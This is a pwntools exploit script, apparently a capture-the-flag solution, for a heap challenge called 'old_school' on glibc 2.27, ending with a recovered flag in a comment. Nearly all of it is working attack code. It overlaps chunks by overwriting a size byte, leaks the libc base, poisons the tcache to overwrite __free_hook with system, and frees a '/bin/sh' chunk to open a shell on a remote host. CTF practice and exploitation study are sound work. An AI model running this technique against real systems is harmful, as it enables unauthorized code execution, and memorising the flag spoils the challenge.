from pwn import *

context.log_level = 'debug'

p = remote('121.36.194.21','49153')
#p = process('./old_school')
elf = ELF('./old_school')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.27.so')

def cmd(ch):
    p.sendlineafter('Your choice: ',str(ch))

def new(idx,size):
    cmd(1)
    p.sendlineafter('Index: ',str(idx))
    p.sendlineafter('Size: ',str(size))

def edit(idx,con):
    cmd(2)
    p.sendlineafter('Index: ',str(idx))
    p.sendafter('Content: ',con)

def show(idx):
    cmd(3)
    p.sendlineafter('Index: ',str(idx))

def free(idx):
    cmd(4)
    p.sendlineafter('Index: ',str(idx))

new(0,0x98)
for i in range(11):
    new(i+1,0x98)
for i in range(7):
    free(i+1)
free(0)

for i in range(7):
    new(7-i,0x98)


edit(8,b'A'*0x90+p64(0x5a0)+p8(0xa0))
for i in range(7):
    free(8-i)
free(9)


new(20,0xA8)

edit(1,'A'*0xF+'\n')
show(1)
p.recvuntil('Content: ')
p.recvuntil('\n')
libc_base = u64(p.recv(6)+b'\x00\x00')-0x3ebca0
p.info('libc_base: '+hex(libc_base))
edit(1,p64(0)+p64(0x591)+p64(libc_base+0x3ebca0)*2+'\n')
new(21,0xA8)
payload = b'A'*0x88+p64(0xa1)+p64(libc_base+libc.sym['__free_hook']-0x8)+b'A'*0x8+b'\n'
edit(21,payload)

new(22,0x98)
new(23,0x98) ###
edit(23,b'/bin/sh\x00'+p64(libc_base+libc.sym['system'])+b'\n')
free(23)


#gdb.attach(p)
p.interactive()
#flag{m0lWJAzDB1vzxMn9PlMQXkPvEmGAdZzB}

    